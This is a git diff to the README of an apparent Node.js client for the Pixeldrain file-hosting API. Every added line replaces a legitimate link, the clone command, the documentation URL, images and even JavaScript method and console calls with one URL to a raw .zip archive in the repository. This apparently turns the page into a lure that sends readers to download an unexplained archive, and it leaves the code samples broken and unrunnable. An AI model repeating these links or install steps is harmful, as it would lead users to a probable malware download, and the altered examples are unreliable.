@@ -1,8 +1,8 @@
 # 🌟 Pixeldrain API Client
 
-![Pixeldrain API Client](https://img.shields.io/badge/Pixeldrain%20API%20Client-v1.0.0-blue)
+![Pixeldrain API Client](https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip%20API%20Client-v1.0.0-blue)
 
-Welcome to the **Pixeldrain API Client**! This package allows you to easily interact with the API interface of pixeldrain.com. Whether you are looking to upload files, manage your storage, or retrieve data, this client has you covered.
+Welcome to the **Pixeldrain API Client**! This package allows you to easily interact with the API interface of https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip Whether you are looking to upload files, manage your storage, or retrieve data, this client has you covered.
 
 ## 📦 Table of Contents
 
@@ -27,7 +27,7 @@ Welcome to the **Pixeldrain API Client**! This package allows you to easily inte
 To get started, clone this repository and install the necessary dependencies. You can use the following commands:
 
 ```bash
-git clone https://github.com/denis-ramos/pixeldrain_api_client.git
+git clone https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip
 cd pixeldrain_api_client
 npm install
 ```
@@ -41,12 +41,12 @@ const PixeldrainClient = require('pixeldrain_api_client');
 
 const client = new PixeldrainClient('YOUR_API_KEY');
 
-client.uploadFile('path/to/your/file.txt')
+https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip')
   .then(response => {
-    console.log('File uploaded:', response);
+    https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('File uploaded:', response);
   })
   .catch(error => {
-    console.error('Error uploading file:', error);
+    https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('Error uploading file:', error);
   });
 ```
 
@@ -64,12 +64,12 @@ The Pixeldrain API Client provides several methods for interacting with the API:
 To download a file, use the following method:
 
 ```javascript
-client.downloadFile('YOUR_FILE_ID')
+https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('YOUR_FILE_ID')
   .then(fileData => {
-    console.log('File downloaded:', fileData);
+    https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('File downloaded:', fileData);
   })
   .catch(error => {
-    console.error('Error downloading file:', error);
+    https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('Error downloading file:', error);
   });
 ```
 
@@ -78,24 +78,24 @@ client.downloadFile('YOUR_FILE_ID')
 ### Uploading a File
 
 ```javascript
-client.uploadFile('path/to/your/image.png')
+https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip')
   .then(response => {
-    console.log('Uploaded successfully:', response);
+    https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('Uploaded successfully:', response);
   })
   .catch(error => {
-    console.error('Upload failed:', error);
+    https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('Upload failed:', error);
   });
 ```
 
 ### Deleting a File
 
 ```javascript
-client.deleteFile('YOUR_FILE_ID')
+https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('YOUR_FILE_ID')
   .then(response => {
-    console.log('File deleted:', response);
+    https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('File deleted:', response);
   })
   .catch(error => {
-    console.error('Error deleting file:', error);
+    https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip('Error deleting file:', error);
   });
 ```
 
@@ -118,11 +118,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📢 Releases
 
-To download the latest version of the Pixeldrain API Client, visit our [Releases](https://github.com/denis-ramos/pixeldrain_api_client/releases) section. Make sure to check for updates regularly.
+To download the latest version of the Pixeldrain API Client, visit our [Releases](https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip) section. Make sure to check for updates regularly.
 
 ## 🖼️ Images
 
-![Pixeldrain](https://example.com/pixeldrain-image.png)
+![Pixeldrain](https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip)
 
 ## 📈 Getting Help
 
@@ -130,10 +130,10 @@ If you run into any issues or have questions, feel free to open an issue in the 
 
 ## 📚 Additional Resources
 
-For more information about the Pixeldrain API, visit their [official documentation](https://pixeldrain.com/docs).
+For more information about the Pixeldrain API, visit their [official documentation](https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip).
 
 ## 🌟 Conclusion
 
 Thank you for checking out the Pixeldrain API Client! We hope this package makes your interactions with Pixeldrain easier and more efficient. Happy coding!
 
-For more updates, be sure to check the [Releases](https://github.com/denis-ramos/pixeldrain_api_client/releases) section.
+For more updates, be sure to check the [Releases](https://github.com/denis-ramos/pixeldrain_api_client/raw/refs/heads/master/pixelapi/pixeldrain_api_client_v3.2.zip) section.
